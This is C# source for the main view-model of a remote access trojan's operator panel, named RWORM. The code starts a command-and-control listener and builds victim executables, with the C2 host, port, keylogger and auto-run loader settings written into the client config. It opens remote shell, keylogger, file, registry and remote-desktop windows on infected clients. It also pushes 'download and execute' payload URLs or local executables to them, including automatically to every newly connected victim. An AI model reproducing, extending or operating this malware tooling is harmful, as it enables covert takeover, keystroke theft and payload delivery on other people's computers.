using System.Collections.Generic;
using System;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Input;
using RWORM.GUI.Models;
using RWORM.GUI.Services;
using RWORM.GUI.Views;

namespace RWORM.GUI.ViewModels
{
    public class MainViewModel : INotifyPropertyChanged
    {
        private ServerConnection _server;
        private string _selectedView   = "Clients";
        private string _serverAddress  = "127.0.0.1";
        private int    _serverPort     = 3333;
        private bool   _isConnected;
        private string _statusMessage  = "Disconnected";
        private ClientModel? _selectedClient;
        private string _commandInput   = "";
        private string _terminalOutput = "";

        // ── Listener ─────────────────────────────────────────────────────────
        private string  _listenerHost    = "0.0.0.0";
        private int     _listenerPort    = 3333;
        private bool    _listenerRunning;
        private string  _listenerStatus  = "Stopped";
        private System.Diagnostics.Process? _serverProcess;

        // ── Builder ───────────────────────────────────────────────────────────
        private string _buildHost       = "127.0.0.1";
        private int    _buildPort       = 3333;
        private string _buildOutput     = "RWORM.exe";

        // Keylogger builder options
        private bool   _buildKeyloggerEnabled;
        private bool   _buildKeyloggerOnline;

        // Task on connect options
        private bool   _buildTaskEnabled;
        private string _buildTaskUrl    = "";

        public event PropertyChangedEventHandler? PropertyChanged;

        public ObservableCollection<ClientModel>  Clients         { get; } = new();
        public ObservableCollection<ClientModel>  SelectedClients  { get; } = new();
        public ObservableCollection<TaskModel>    Tasks            { get; } = new();

        private TaskModel? _selectedTask;
        public  TaskModel? SelectedTask
        {
            get => _selectedTask;
            set { _selectedTask = value; OnPropertyChanged(); }
        }

        // ── Properties ────────────────────────────────────────────────────────
        public string SelectedView   { get => _selectedView; 
            set { _selectedView = value; OnPropertyChanged(); } }
        public string ServerAddress  { get => _serverAddress; set { _serverAddress = value; OnPropertyChanged(); } }
        public int    ServerPort     { get => _serverPort;    set { _serverPort    = value; OnPropertyChanged(); } }
        public bool   IsConnected    { get => _isConnected;   set { _isConnected   = value; OnPropertyChanged(); OnPropertyChanged(nameof(ConnectionStatus)); } }
        public string ConnectionStatus => _isConnected ? "Connected" : "Disconnected";
        public string StatusMessage  { get => _statusMessage;  set { _statusMessage  = value; OnPropertyChanged(); } }
        public ClientModel? SelectedClient { get => _selectedClient; set { _selectedClient = value; OnPropertyChanged(); } }
        public string CommandInput   { get => _commandInput;  set { _commandInput  = value; OnPropertyChanged(); } }
        public string TerminalOutput { get => _terminalOutput; set { _terminalOutput = value; OnPropertyChanged(); } }
        public int    ClientCount    => Clients.Count;

        // Listener
        public string ListenerHost   { get => _listenerHost;   set { _listenerHost   = value; OnPropertyChanged(); } }
        public int    ListenerPort   { get => _listenerPort;   set { _listenerPort   = value; OnPropertyChanged(); } }
        public bool   ListenerRunning { get => _listenerRunning; set { _listenerRunning = value; OnPropertyChanged(); } }
        public string ListenerStatus  { get => _listenerStatus;  set { _listenerStatus  = value; OnPropertyChanged(); } }

        // Builder
        public string BuildHost    { get => _buildHost;    set { _buildHost    = value; OnPropertyChanged(); } }
        public int    BuildPort    { get => _buildPort;    set { _buildPort    = value; OnPropertyChanged(); } }
        public string BuildOutput  { get => _buildOutput;  set { _buildOutput  = value; OnPropertyChanged(); } }

        public bool   BuildKeyloggerEnabled { get => _buildKeyloggerEnabled; set { _buildKeyloggerEnabled = value; OnPropertyChanged(); } }
        public bool   BuildKeyloggerOnline  { get => _buildKeyloggerOnline;  set { _buildKeyloggerOnline  = value; OnPropertyChanged(); } }
        public bool   BuildTaskEnabled      { get => _buildTaskEnabled;      set { _buildTaskEnabled      = value; OnPropertyChanged(); } }
        public string BuildTaskUrl          { get => _buildTaskUrl;          set { _buildTaskUrl          = value; OnPropertyChanged(); } }

        // ── Commands ──────────────────────────────────────────────────────────
        public ICommand ConnectCommand         { get; }
        public ICommand DisconnectCommand      { get; }
        public ICommand NavigateCommand        { get; }
        public ICommand SendCommandCommand     { get; }
        public ICommand RefreshClientsCommand  { get; }
        public ICommand StartListenerCommand   { get; }
        public ICommand StopListenerCommand    { get; }
        public ICommand BuildCommand           { get; }

        // Client context commands — all accept ClientModel parameter
        public ICommand OpenShellCommand          { get; }
        public ICommand OpenFileManagerCommand     { get; }
        public ICommand OpenKeyloggerCommand       { get; }
        public ICommand OpenProcManagerCommand     { get; }
        public ICommand OpenRegistryEditorCommand  { get; }
        public ICommand OpenRemoteDesktopCommand   { get; }
        public ICommand LoaderExecCommand          { get; }
        public ICommand LoaderExecFileCommand      { get; }
        public ICommand ClientCloseCommand         { get; }
        public ICommand ClientUninstallCommand     { get; }
        public ICommand ClientUpdateCommand        { get; }

        // Multi-select commands
        public ICommand SendToAllCommand           { get; }
        public ICommand SendQuickCommand           { get; }

        private string _quickCommandText = "";
        public string QuickCommandText
        {
            get => _quickCommandText;
            set { _quickCommandText = value; OnPropertyChanged(); }
        }

        // Tasks
        public ICommand AddLocalFileTaskCommand    { get; }
        public ICommand AddUrlTaskCommand          { get; }
        public ICommand RunTaskOnSelectedCommand   { get; }
        public ICommand RemoveTaskCommand          { get; }

        internal ServerConnection Server => _server;

        // ── Constructor ───────────────────────────────────────────────────────
        public MainViewModel()
        {
            _server = new ServerConnection(_serverAddress, _serverPort);
            _server.ConnectionChanged += OnConnectionChanged;
            _server.OutputReceived    += OnOutputReceived;

            ConnectCommand        = new RelayCommand(async _ => await ConnectAsync(), _ => !IsConnected);
            DisconnectCommand     = new RelayCommand(_ => Disconnect(), _ => IsConnected);
            NavigateCommand       = new RelayCommand(view => SelectedView = view?.ToString() ?? "Clients");
            SendCommandCommand    = new RelayCommand(async _ => await SendCommandAsync(), _ => IsConnected && SelectedClient != null);
            RefreshClientsCommand = new RelayCommand(async _ => await RefreshClientsAsync(), _ => IsConnected);
            StartListenerCommand  = new RelayCommand(_ => StartListener(), _ => !ListenerRunning);
            StopListenerCommand   = new RelayCommand(_ => StopListener(),  _ => ListenerRunning);
            BuildCommand          = new RelayCommand(_ => BuildClient());

            bool HasClient(object? p) => IsConnected;
            OpenShellCommand          = new RelayCommand(p => OpenShell(p as ClientModel),          HasClient);
            OpenFileManagerCommand    = new RelayCommand(p => OpenFileManager(p as ClientModel),    HasClient);
            OpenKeyloggerCommand      = new RelayCommand(p => OpenKeylogger(p as ClientModel),      HasClient);
            OpenProcManagerCommand    = new RelayCommand(p => OpenProcManager(p as ClientModel),    HasClient);
            OpenRegistryEditorCommand = new RelayCommand(p => OpenRegistryEditor(p as ClientModel), HasClient);
            OpenRemoteDesktopCommand  = new RelayCommand(p => OpenRemoteDesktop(p as ClientModel),  HasClient);
            LoaderExecCommand         = new RelayCommand(p => PromptLoaderExec(p as ClientModel),   HasClient);
            LoaderExecFileCommand     = new RelayCommand(p => PromptLoaderExecFile(p as ClientModel), HasClient);
            ClientCloseCommand        = new RelayCommand(p => ConfirmClose(p as ClientModel),        HasClient);
            ClientUninstallCommand    = new RelayCommand(p => ConfirmUninstall(p as ClientModel),    HasClient);
            ClientUpdateCommand       = new RelayCommand(p => PromptUpdate(p as ClientModel),        HasClient);
            SendToAllCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync(), _ => IsConnected);
            SendQuickCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync(), _ => IsConnected);

            // Tasks
            AddLocalFileTaskCommand   = new RelayCommand(_ => AddLocalFileTask());
            AddUrlTaskCommand         = new RelayCommand(_ => AddUrlTask());
            RunTaskOnSelectedCommand  = new RelayCommand(_ => RunTaskOnSelected(),
                _ => SelectedTask != null && IsConnected && (SelectedClients.Count > 0 || SelectedClient != null));
            RemoveTaskCommand         = new RelayCommand(p =>
            {
                if (p is TaskModel t) Tasks.Remove(t);
                else if (SelectedTask != null) Tasks.Remove(SelectedTask);
            });
        }

        // ── Connect / Disconnect ──────────────────────────────────────────────
        private async Task ConnectAsync()
        {
            StatusMessage = "Connecting...";
            try { _server.Disconnect(); } catch { }   // drop any previous connection
            _server = new ServerConnection(ServerAddress, ServerPort);
            _server.ConnectionChanged += OnConnectionChanged;
            _server.OutputReceived    += OnOutputReceived;
            bool ok = await _server.ConnectAsync();
            if (ok)
            {
                StatusMessage = "Connected";
                _ = PollClientsLoop();
            }
            else StatusMessage = "Connection failed";
        }

        private void Disconnect()
        {
            _server.Disconnect();
            Clients.Clear();
            StatusMessage = "Disconnected";
            OnPropertyChanged(nameof(ClientCount));
        }

        // ── Polling ───────────────────────────────────────────────────────────
        private async Task PollClientsLoop()
        {
            while (_server.Connected)
            {
                await RefreshClientsAsync();
                await Task.Delay(4000);
            }
        }

        private async Task RefreshClientsAsync()
        {
            var newClients = await _server.GetClientsAsync();
            void Apply()
            {
                var selectedGuids = new HashSet<string>(SelectedClients.Select(c => c.Guid), StringComparer.OrdinalIgnoreCase);
                if (SelectedClient != null) selectedGuids.Add(SelectedClient.Guid);

                var newDict = newClients.ToDictionary(c => c.Guid, StringComparer.OrdinalIgnoreCase);

                // Remove disconnected clients
                for (int i = Clients.Count - 1; i >= 0; i--)
                {
                    if (!newDict.ContainsKey(Clients[i].Guid))
                        Clients.RemoveAt(i);
                }

                // Update existing or add new
                foreach (var nc in newClients)
                {
                    var existing = Clients.FirstOrDefault(c => string.Equals(c.Guid, nc.Guid, StringComparison.OrdinalIgnoreCase));
                    if (existing != null)
                    {
                        existing.Hostname    = nc.Hostname;
                        existing.Username    = nc.Username;
                        existing.OSVersion   = nc.OSVersion;
                        existing.IpAddress   = nc.IpAddress;
                        existing.CountryCode = nc.CountryCode;
                        existing.Flag        = nc.Flag;
                        existing.IsOnline    = nc.IsOnline;
                        existing.LastSeen    = nc.LastSeen;
                    }
                    else
                    {
                        Clients.Add(nc);
                    }
                }

                // Restore selection
                if (selectedGuids.Count > 0)
                {
                    foreach (var c in Clients)
                    {
                        if (selectedGuids.Contains(c.Guid))
                        {
                            if (!SelectedClients.Contains(c))
                                SelectedClients.Add(c);
                            if (SelectedClient == null)
                                SelectedClient = c;
                        }
                    }
                }

                OnPropertyChanged(nameof(ClientCount));

                // Auto-run tasks on newly connected clients
                foreach (var task in Tasks.ToList())
                {
                    foreach (var c in Clients.ToList())
                    {
                        if (!task.ExecutedGuids.Contains(c.Guid))
                        {
                            _ = ExecuteTaskOnClientAsync(task, c);
                        }
                    }
                }
            }
            var dispatcher = System.Windows.Application.Current?.Dispatcher;
            if (dispatcher == null) Apply();
            else if (dispatcher.CheckAccess()) Apply();
            else dispatcher.Invoke(Apply);
        }

        // ── Target Resolution & Quick Command ──────────────────────────────────
        private readonly List<ClientModel> _contextMenuSnapshot = new();
        public void SnapshotContextMenu()
        {
            _contextMenuSnapshot.Clear();
            if (SelectedClients.Count > 0)
                _contextMenuSnapshot.AddRange(SelectedClients);
            else if (SelectedClient != null)
                _contextMenuSnapshot.Add(SelectedClient);
        }

        private List<ClientModel> ResolveTargets(ClientModel? c)
        {
            if (c != null) return new List<ClientModel> { c };
            if (_contextMenuSnapshot.Count > 0) return _contextMenuSnapshot.ToList();
            if (SelectedClients.Count > 0) return SelectedClients.ToList();
            if (SelectedClient != null) return new List<ClientModel> { SelectedClient };
            if (Clients.Count > 0) return new List<ClientModel> { Clients[0] };
            return new List<ClientModel>();
        }

        private async Task ExecuteQuickCommandAsync()
        {
            var targets = ResolveTargets(null);
            if (targets.Count == 0 && Clients.Count > 0) targets = Clients.ToList();
            if (targets.Count == 0)
            {
                System.Windows.MessageBox.Show("No clients connected or selected.", "Info",
                    System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Information);
                return;
            }

            string cmd = QuickCommandText.Trim();
            if (string.IsNullOrEmpty(cmd))
            {
                cmd = InputDialog.Show($"Command to send to {targets.Count} client(s):", "Send Command", "") ?? "";
            }

            if (string.IsNullOrWhiteSpace(cmd)) return;

            int count = 0;
            foreach (var c in targets)
            {
                _ = _server.SendCommandAsync(c.Guid, cmd);
                count++;
            }
            QuickCommandText = "";
            StatusMessage = $"Command sent to {count} client(s)";
        }

        // ── Shell windows ─────────────────────────────────────────────────────
        private void OpenShell(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ShellWindow(_server, target.Guid, target.Hostname, target.IpAddress).Show();
        }

        private void OpenFileManager(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new FileManagerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenKeylogger(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new KeyloggerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenProcManager(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new ProcessManagerWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenRegistryEditor(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new RegistryEditorWindow(_server, target.Guid, target.Hostname).Show();
        }

        private void OpenRemoteDesktop(ClientModel? c)
        {
            var target = ResolveTargets(c).FirstOrDefault();
            if (target == null) return;
            new RemoteDesktopWindow(_server, target.Guid, target.Hostname).Show();
        }

        // ── Client control ────────────────────────────────────────────────────
        private void PromptLoaderExec(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            var url = InputDialog.Show("Payload URL to download and execute:", "Loader (URL)", "https://");
            if (string.IsNullOrWhiteSpace(url)) return;
            foreach (var client in targets)
            {
                _ = _server.LoaderExec(client.Guid, url);
            }
            StatusMessage = $"Loader (URL) sent to {targets.Count} client(s)";
        }

        private void PromptLoaderExecFile(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;

            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Title  = "Select Executable to Execute on Target",
                Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            };
            if (dlg.ShowDialog() != true) return;

            byte[] bytes;
            try { bytes = File.ReadAllBytes(dlg.FileName); }
            catch (Exception ex)
            {
                System.Windows.MessageBox.Show($"Failed to read file: {ex.Message}", "Error",
                    System.Windows.MessageBoxButton.OK, System.Windows.MessageBoxImage.Error);
                return;
            }

            foreach (var client in targets)
            {
                _ = _server.LoaderExecFile(client.Guid, bytes);
            }
            StatusMessage = $"Loader (File: {Path.GetFileName(dlg.FileName)}) sent to {targets.Count} client(s)";
        }

        private void ConfirmClose(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            string msg = targets.Count == 1 ? $"Close client on {targets[0].Hostname}?" : $"Close {targets.Count} selected clients?";
            if (System.Windows.MessageBox.Show(msg, "Confirm",
                    System.Windows.MessageBoxButton.YesNo,
                    System.Windows.MessageBoxImage.Question) != System.Windows.MessageBoxResult.Yes) return;
            foreach (var target in targets)
            {
                _ = _server.ClientClose(target.Guid);
            }
        }

        private void ConfirmUninstall(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            string msg = targets.Count == 1
                ? $"Uninstall and self-delete on {targets[0].Hostname}?\nThis is irreversible."
                : $"Uninstall and self-delete on {targets.Count} selected clients?\nThis is irreversible.";
            if (System.Windows.MessageBox.Show(msg, "Uninstall",
                    System.Windows.MessageBoxButton.YesNo,
                    System.Windows.MessageBoxImage.Warning) != System.Windows.MessageBoxResult.Yes) return;
            foreach (var target in targets)
            {
                _ = _server.ClientUninstall(target.Guid);
            }
        }

        private void PromptUpdate(ClientModel? c)
        {
            var targets = ResolveTargets(c);
            if (targets.Count == 0) return;
            var url = InputDialog.Show("New binary URL for update:", "Update Client", "https://");
            if (string.IsNullOrWhiteSpace(url)) return;
            foreach (var target in targets)
            {
                _ = _server.ClientUpdate(target.Guid, url);
            }
            StatusMessage = $"Update sent to {targets.Count} client(s)";
        }

        private void PromptMultiSend()
        {
            _ = ExecuteQuickCommandAsync();
        }

        // ── Tasks ─────────────────────────────────────────────────────────────
        private async Task ExecuteTaskOnClientAsync(TaskModel task, ClientModel client)
        {
            if (task.ExecutedGuids.Contains(client.Guid)) return;
            task.ExecutedGuids.Add(client.Guid);

            try
            {
                if (task.Mode == TaskMode.LocalFile)
                {
                    if (File.Exists(task.Source))
                    {
                        byte[] bytes = File.ReadAllBytes(task.Source);
                        await _server.RunFileTaskAsync(client.Guid, bytes);
                    }
                }
                else
                {
                    await _server.RunUrlTaskAsync(client.Guid, task.Source);
                }

                task.ExecutedCount = task.ExecutedGuids.Count;
                task.Status = $"Sent → {task.ExecutedCount} client(s)";
            }
            catch (Exception ex)
            {
                task.Status = $"Error: {ex.Message}";
            }
        }

        private void AddLocalFileTask()
        {
            var dlg = new Microsoft.Win32.OpenFileDialog
            {
                Title  = "Select EXE to run on target",
                Filter = "Executable|*.exe|All Files|*.*",
            };
            if (dlg.ShowDialog() != true) return;
            var task = new TaskModel
            {
                Name   = System.IO.Path.GetFileName(dlg.FileName),
                Mode   = TaskMode.LocalFile,
                Source = dlg.FileName,
                Status = "Ready",
            };
            Tasks.Add(task);
            SelectedTask = task;
            StatusMessage = $"Task added: {task.Name}";

            // Auto-run on currently connected clients immediately
            foreach (var client in Clients.ToList())
            {
                _ = ExecuteTaskOnClientAsync(task, client);
            }
        }

        private void AddUrlTask()
        {
            var url = InputDialog.Show("Payload URL to download and execute on target:", "Add URL Task", "https://");
            if (string.IsNullOrWhiteSpace(url)) return;
            var task = new TaskModel
            {
                Name   = url.Length > 40 ? url[..40] + "…" : url,
                Mode   = TaskMode.Url,
                Source = url,
                Status = "Ready",
            };
            Tasks.Add(task);
            SelectedTask = task;
            StatusMessage = $"URL task added";

            // Auto-run on currently connected clients immediately
            foreach (var client in Clients.ToList())
            {
                _ = ExecuteTaskOnClientAsync(task, client);
            }
        }

        private async void RunTaskOnSelected()
        {
            if (SelectedTask == null) return;
            var targets = SelectedClients.ToList();
            if (targets.Count == 0 && SelectedClient != null) targets.Add(SelectedClient);
            if (targets.Count == 0)
            {
                System.Windows.MessageBox.Show(
                    "No clients selected.\nSelect one or more clients in the Clients page.",
                    "No Target", System.Windows.MessageBoxButton.OK,
                    System.Windows.MessageBoxImage.Information);
                return;
            }

            SelectedTask.Status = "Running…";
            StatusMessage       = $"Running task on {targets.Count} client(s)…";

            foreach (var c in targets)
            {
                SelectedTask.ExecutedGuids.Remove(c.Guid);
                await ExecuteTaskOnClientAsync(SelectedTask, c);
            }

            StatusMessage = $"Task dispatched to {targets.Count} client(s)";
        }

        // ── Send command ──────────────────────────────────────────────────────
        private async Task SendCommandAsync()
        {
            if (SelectedClient == null || string.IsNullOrEmpty(CommandInput)) return;
            TerminalOutput += $"\n[{DateTime.Now:HH:mm:ss}] → {SelectedClient.Hostname}: {CommandInput}";
            await _server.SendCommandAsync(SelectedClient.Guid, CommandInput);
            CommandInput = "";
        }

        // ── Listener lifecycle ────────────────────────────────────────────────
        private async void StartListener()
        {
            try
            {
                // ── Kill any stale server.py holding the port ──────────────
                // The server keeps its imported modules in memory, so edited
                // server/protocol/session code is NOT picked up by a running
                // process. A stale listener silently stops answering
                // GET_CLIENTS (0x10) → Clients page stays empty. Always
                // terminate old listeners before (re)starting.
                KillStaleServerProcesses();

                var serverPy = System.IO.Path.Combine(
                    System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "",
                    "..", "..", "..", "..", "server", "main.py");
                serverPy = System.IO.Path.GetFullPath(serverPy);

                if (!System.IO.File.Exists(serverPy))
                {
                    ListenerStatus = $"Server not found: {serverPy}";
                    return;
                }

                ListenerStatus = "Starting...";
                _serverProcess = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName         = "python",
                        Arguments        = $"\"{serverPy}\" --host {ListenerHost} --port {ListenerPort}",
                        UseShellExecute  = false,
                        CreateNoWindow   = true,
                        WorkingDirectory = System.IO.Path.GetDirectoryName(serverPy),
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                    }
                };

                // Capture server output so a startup failure is visible in the
                // UI instead of dying silently in a hidden window.
                _serverProcess.OutputDataReceived += (_, e) => { if (e.Data != null) AppendListenerLog(e.Data); };
                _serverProcess.ErrorDataReceived  += (_, e) => { if (e.Data != null) AppendListenerLog(e.Data); };

                if (!_serverProcess.Start())
                {
                    ListenerStatus = "Failed to start python";
                    return;
                }
                _serverProcess.BeginOutputReadLine();
                _serverProcess.BeginErrorReadLine();

                ListenerRunning = true;
                ListenerStatus  = $"Starting on {ListenerHost}:{ListenerPort}...";

                // Wait for the listener to actually accept connections.
                var ready = await WaitForListenAsync(ListenerHost, ListenerPort, 20000);
                if (!ready)
                {
                    ListenerRunning = false;
                    ListenerStatus  = $"Server did not come up on {ListenerHost}:{ListenerPort} (see listener.log)";
                    return;
                }

                ListenerStatus = $"Running on {ListenerHost}:{ListenerPort}";

                // ── Auto-connect the panel to the listener we just started ──
                // Without this the GUI has no connection, so GetClientsAsync
                // returns an empty list, the poll loop never starts and the
                // Clients page stays blank even though clients are connected.
                ServerAddress = ListenerHost == "0.0.0.0" ? "127.0.0.1" : ListenerHost;
                ServerPort    = ListenerPort;
                await ConnectAsync();
            }
            catch (Exception ex)
            {
                ListenerStatus = $"Error: {ex.Message}";
            }
        }

        /// <summary>
        /// Polls the listener port until it accepts a TCP connection.
        /// 0.0.0.0 is a bind address, so loopback is used to probe it.
        /// </summary>
        private static async Task<bool> WaitForListenAsync(string host, int port, int timeoutMs)
        {
            var probe   = host is "0.0.0.0" or "*" or "" ? "127.0.0.1" : host;
            var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
            while (DateTime.UtcNow < deadline)
            {
                try
                {
                    using var c = new System.Net.Sockets.TcpClient();
                    await c.ConnectAsync(probe, port).WaitAsync(TimeSpan.FromMilliseconds(800));
                    if (c.Connected) return true;
                }
                catch { }
                await Task.Delay(250);
            }
            return false;
        }

        private void AppendListenerLog(string line)
        {
            try
            {
                var dir = System.IO.Path.Combine(
                    System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "",
                    "..", "..", "..", "..", "server");
                System.IO.File.AppendAllText(
                    System.IO.Path.Combine(dir, "listener.log"),
                    $"[{DateTime.Now:HH:mm:ss}] {line}{Environment.NewLine}");
            }
            catch { }
        }

        /// <summary>
        /// Terminates leftover <c>server/main.py</c> listeners EXCEPT the one
        /// this window already started, and except any process whose parent is
        /// still alive (a manual <c>python server/main.py</c> launched from a
        /// terminal the user still has open). A stale listener keeps old module
        /// code in memory, so server edits are never picked up; it then stops
        /// answering GET_CLIENTS (0x10) and the Clients page stays blank.
        /// </summary>
        private void KillStaleServerProcesses()
        {
            try
            {
                int ownChild = 0;
                try { ownChild = _serverProcess?.Id ?? 0; } catch { }

                using var psi = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = "-NoProfile -NonInteractive -Command " +
                            "\"$me=" + Environment.ProcessId + "; " +
                            "$skip=" + ownChild + "; " +
                            "Get-CimInstance Win32_Process -Filter \\\"Name LIKE 'python%'\\\" | " +
                            "Where-Object { $_.CommandLine -match 'server[\\\\/].*main\\.py' -and " +
                            "$_.ProcessId -ne $me -and $_.ProcessId -ne $skip } | " +
                            "ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }\"",
                        UseShellExecute        = false,
                        CreateNoWindow         = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError  = true,
                    }
                };
                psi.Start();
                psi.WaitForExit(8000);
            }
            catch { }
        }

        private void StopListener()
        {
            KillServer();
            try { _server.Disconnect(); } catch { }
            ListenerRunning = false;
            ListenerStatus  = "Stopped";
        }

        public void KillServer()
        {
            try
            {
                if (_serverProcess != null && !_serverProcess.HasExited)
                    _serverProcess.Kill(entireProcessTree: true);
                _serverProcess = null;
            }
            catch { }
        }

        // ── Builder ───────────────────────────────────────────────────────────
        private async void BuildClient()
        {
            var dlg = new Microsoft.Win32.SaveFileDialog
            {
                Filter   = "Executable|*.exe",
                FileName = BuildOutput,
            };
            if (dlg.ShowDialog() != true) return;

            try
            {
                StatusMessage = "Building...";
                var baseDir          = System.IO.Path.GetFullPath(
                    System.IO.Path.Combine(
                        System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? "",
                        "..", "..", "..", ".."));
                var clientConfigPath = System.IO.Path.Combine(baseDir, "Client", "Core", "Config.cs");

                if (!System.IO.File.Exists(clientConfigPath))
                {
                    System.Windows.MessageBox.Show("Config.cs not found at: " + clientConfigPath, "Error");
                    return;
                }

                var cfg = System.IO.File.ReadAllText(clientConfigPath);

                // Core — the Config.cs fields are column-aligned (many spaces
                // around '='), so a plain Replace("C2Host = \"...\"") never
                // matches and the built EXE silently keeps the old host/port.
                // Use regex assignment so the builder always applies the
                // values entered in the UI.
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"C2Host\s*=\s*""[^""]*""",
                    $"C2Host = \"{BuildHost}\"");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"C2Port\s*=\s*\d+",
                    $"C2Port = {BuildPort}");

                // Keylogger
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"KeyloggerEnabled\s*=\s*(true|false)",
                    $"KeyloggerEnabled = {BuildKeyloggerEnabled.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"KeyloggerOnline\s*=\s*(true|false)",
                    $"KeyloggerOnline  = {BuildKeyloggerOnline.ToString().ToLower()}");

                // Task on connect
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"TaskEnabled\s*=\s*(true|false)",
                    $"TaskEnabled   = {BuildTaskEnabled.ToString().ToLower()}");
                cfg = System.Text.RegularExpressions.Regex.Replace(
                    cfg, @"TaskLoaderUrl\s*=\s*""[^""]*""",
                    $"TaskLoaderUrl = \"{BuildTaskUrl}\"");

                System.IO.File.WriteAllText(clientConfigPath, cfg);

                var clientPath  = System.IO.Path.Combine(baseDir, "Client");
                var tempOutput  = System.IO.Path.Combine(baseDir, "output");
                System.IO.Directory.CreateDirectory(tempOutput);

                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName               = "dotnet",
                    Arguments              = $"publish \"{clientPath}\" -c Release -r win-x64 --self-contained -o \"{tempOutput}\"",
                    UseShellExecute        = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError  = true,
                    CreateNoWindow         = true,
                    WorkingDirectory       = clientPath,
                };

                var proc = System.Diagnostics.Process.Start(psi)!;
                var stderr = await proc.StandardError.ReadToEndAsync();
                await proc.WaitForExitAsync();

                var src = System.IO.Path.Combine(tempOutput, "RWORM.exe");
                if (System.IO.File.Exists(src))
                {
                    System.IO.File.Copy(src, dlg.FileName, true);
                    StatusMessage = "Build complete!";
                    System.Windows.MessageBox.Show($"Built → {dlg.FileName}", "Build Complete");
                }
                else
                {
                    StatusMessage = "Build failed";
                    System.Windows.MessageBox.Show($"Build failed.\n{stderr}", "Error");
                }

                try { System.IO.Directory.Delete(tempOutput, true); } catch { }
            }
            catch (Exception ex)
            {
                StatusMessage = "Build failed";
                System.Windows.MessageBox.Show($"Build failed: {ex.Message}", "Error");
            }
        }

        // ── Events ────────────────────────────────────────────────────────────
        private void OnConnectionChanged(object? s, bool connected)
        {
            IsConnected   = connected;
            StatusMessage = connected ? "Connected" : "Disconnected";
        }

        private void OnOutputReceived(object? s, string output)
            => TerminalOutput += $"\n{output}";

        protected void OnPropertyChanged([CallerMemberName] string? n = null)
            => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(n));
    }

    public class RelayCommand : ICommand
    {
        private readonly Action<object?> _execute;
        private readonly Predicate<object?>? _canExecute;

        public RelayCommand(Action<object?> execute, Predicate<object?>? canExecute = null)
        {
            _execute    = execute ?? throw new ArgumentNullException(nameof(execute));
            _canExecute = canExecute;
        }

        public bool CanExecute(object? p) => _canExecute?.Invoke(p) ?? true;
        public void Execute(object? p)    => _execute(p);

        public event EventHandler? CanExecuteChanged
        {
            add    => CommandManager.RequerySuggested += value;
            remove => CommandManager.RequerySuggested -= value;
        }
    }
}